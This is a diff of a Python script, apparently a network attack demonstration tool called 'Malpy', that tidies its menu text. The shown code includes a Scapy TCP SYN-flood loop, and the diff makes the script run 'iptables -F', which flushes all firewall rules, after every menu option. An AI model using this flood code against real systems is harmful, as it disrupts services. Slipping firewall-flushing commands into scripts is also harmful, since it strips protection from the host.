@@ -26,9 +26,9 @@ def menu():
 #									       #
 #									       #
 #      								               #
-#      This module demonstrates   					       #
-#   various attacks including Smurf Attack & TCP SYN Flood attacks. References #
-#   toward detection and remediation for vulnerabilites are also mentioned.    #
+#      This module demonstrates various attacks including Smurf Attack &       #
+#      TCP SYN Flood attacks. References toward detection and remediation      #
+#      for vulnerabilites are also mentioned.    			       #
 ################################################################################
 
  Menu
@@ -38,9 +38,9 @@ def menu():
 
  2. TCP SYN Flood Attack
 
- 3. UDP Flood Attack (multithreading support, check # comments)
+ 3. UDP Flood Attack
 
- 4. q == quit
+ 4. Quit
 
  a. Check your LAN IP.
 
@@ -86,8 +86,6 @@ while 1:
                 synAttk = IP(dst=dstIP) / TCP(dport=dport,
                 sport=RandShort(), flags='S')
                 Attk = sr1(synAttk, inter=0.0000001, timeout=2, verbose=1)
-	    os.system('iptables -F')
-	    print '\niptables -F == True'
 	    print "Returning to menu..."
 	    time.sleep(1)
             break
@@ -129,10 +127,13 @@ while 1:
         os.system('ifconfig')
         print 'Returning to menu...'
         time.sleep(1)
-    elif userInput == 'q':
+    elif userInput == '4':
 	print '\nQuitting Malpy...'
 	time.sleep(1)
 	sys.exit("\n")
     else:
         print '\nError Exiting'
         sys.exit("\n")
+
+    os.system('iptables -F')
+    print '\nOption Finished'
